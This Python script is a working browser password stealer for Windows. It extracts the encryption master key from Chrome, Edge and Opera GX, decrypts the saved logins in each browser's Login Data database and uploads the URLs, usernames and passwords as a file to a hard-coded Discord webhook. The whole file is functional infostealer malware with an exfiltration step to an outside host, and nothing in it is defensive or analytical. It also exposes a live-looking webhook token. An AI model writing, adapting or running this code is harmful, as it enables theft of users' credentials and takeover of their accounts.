import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import time
from datetime import datetime, timedelta
import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1320922615602221097/lpXbNg22dAgmT4VvGAFnfS8TTDrPKKesxKf4zJE_vSmUXNljWNhxMG1dAjyVyVK6wQl5"  # Replace with your actual webhook URL

def convert_date(ft):
    utc = datetime.utcfromtimestamp(((10 * int(ft)) - 116444736000000000) / 10000000)
    return utc.strftime('%Y-%m-%d %H:%M:%S')

def get_master_key(browser="edge"):
    try:
        if browser == "edge":
            path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Microsoft\Edge\User Data\Local State')
        elif browser == "chrome":
            path = os.path.join(os.environ["USERPROFILE"], r'AppData\Local\Google\Chrome\User Data\Local State')
        elif browser == "opera":
            path = os.path.join(os.environ["USERPROFILE"], r'AppData\Roaming\Opera Software\Opera GX Stable\Local State') # Correct Opera GX path
        else:
            return None
        with open(path, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except FileNotFoundError:
        print(f"{browser.capitalize()} browser not found.")
        return None
    except json.JSONDecodeError:
        print(f"Error decoding {browser.capitalize()} Local State file.")
        return None
    try:
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    except (KeyError, ValueError, win32crypt.error) as e:
        print(f"Error getting master key for {browser}: {e}")
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        return decrypted_pass[:-16].decode()
    except Exception as e:
        print(f"Password decryption failed: {e}")
        return "Decryption failed"

def get_passwords(browser="edge"):
    master_key = get_master_key(browser)
    if master_key is None:
        return {}

    if browser == "edge":
        login_db = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data')
    elif browser == "chrome":
        login_db = os.path.join(os.environ["USERPROFILE"], r'AppData\Local\Google\Chrome\User Data\Default\Login Data')
    elif browser == "opera":
        login_db = os.path.join(os.environ["USERPROFILE"], r'AppData\Roaming\Opera Software\Opera GX Stable\Login Data') # Correct Opera GX path
    else:
        return {}

    try:
        shutil.copy2(login_db, "Loginvault.db")
    except FileNotFoundError:
        print(f"{browser.capitalize()} login database not found.")
        return {}
    except Exception as e:
        print(f"Error copying {browser.capitalize()} database: {e}")
        return {}

    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    passwords = {}

    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if username or decrypted_password:
                passwords[url] = [username, decrypted_password]
    except sqlite3.OperationalError as e:
        print(f"Error querying {browser.capitalize()} database: {e}")
    finally:
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except Exception as e:
            print(f"Error deleting temporary database: {e}")
    return passwords

def send_to_webhook(passwords):
    if not passwords:
        print("No passwords found.")
        return

    try:
        # Create a text file in memory
        from io import StringIO  # Use StringIO for in-memory file
        output = StringIO()

        for url, creds in passwords.items():
            username, password = creds
            output.write(f"URL: {url}\n")
            output.write(f"Username: {username}\n")
            output.write(f"Password: {password}\n\n")

        output.seek(0)  # Go to the beginning of the file

        # Send the file via webhook
        files = {'file': ('passwords.txt', output.getvalue(), 'text/plain')} # changed from message to file
        response = requests.post(WEBHOOK_URL, files=files)

        if response.status_code != 200 and response.status_code != 204:
            print(f"Error sending webhook: {response.status_code} - {response.text}")
            return

        print("Passwords sent to webhook as a file successfully!")

    except Exception as e:
        print(f"Error sending webhook: {e}")


if __name__ == "__main__":
    all_passwords = {}
    all_passwords.update(get_passwords("chrome"))
    all_passwords.update(get_passwords("edge"))
    all_passwords.update(get_passwords("opera")) # Corrected Opera GX path

    send_to_webhook(all_passwords)